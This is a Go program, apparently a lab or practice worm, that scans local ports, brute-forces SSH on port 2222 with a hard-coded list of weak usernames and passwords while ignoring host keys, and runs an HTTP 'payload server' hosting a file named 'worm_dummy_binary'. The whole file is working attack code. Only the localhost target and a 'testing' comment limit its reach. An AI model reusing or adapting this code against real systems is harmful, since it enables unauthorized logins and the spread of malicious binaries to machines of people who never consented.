package main

import (
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// intentionally used weak creds for testing purposes
var usernames = []string{"root", "admin", "user", "kali"}
var passwords = []string{"toor", "admin", "123456", "password"}

func main() {
	go startInfectionServer()

	target := "127.0.0.1"
	fmt.Printf("[*] Starting active scan for open SSH ports on %s...\n", target)

	var wg sync.WaitGroup

	for port := 2100; port <= 2250; port++ {
		wg.Add(1)

		go func(p int) {
			defer wg.Done()
			if scanPort(target, p) {
				if p == 2222 {
					fmt.Println("SSH Port detected. Launching attack.")
					attackSSH(target, p)
				}
			}
		}(port)

	}

	wg.Wait()
	fmt.Println("[*] Scan completed.")
	select {}
}

func scanPort(ip string, port int) bool {
	address := fmt.Sprintf("%s:%d", ip, port)

	conn, err := net.DialTimeout("tcp", address, 500*time.Millisecond)

	if err != nil {
		return false
	}

	conn.Close()
	fmt.Printf("[+] SSH PORT FOUND: %d\n", port)
	fmt.Println("[!] Starting BruteForce")
	return true
}

func attackSSH(target string, p int) {
	for _, user := range usernames {
		for _, password := range passwords {

			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(password),
				},

				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         300 * time.Second,
			}

			address := fmt.Sprintf("%s:%d", target, p)

			conn, err := ssh.Dial("tcp", address, config)

			if err == nil {

				fmt.Printf("SSH access success for User: %s Password: %s\n", user, password)
				conn.Close()

				return
			}
		}
	}
	fmt.Println("BruteForce failed.")
}

func startInfectionServer() {
	port := "8080"
	filename := "worm_dummy_binary"

	fmt.Printf("[*] Payload Server started. Binary hosted at https://localhost:%s\n", port)

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {

		fmt.Printf("[+] Remote download requested from %s", r.RemoteAddr)

		http.ServeFile(w, r, filename)
	})

	err := http.ListenAndServe(":"+port, nil)
	if err != nil {
		fmt.Printf("Server crashed: %s\n", err)
	}
}
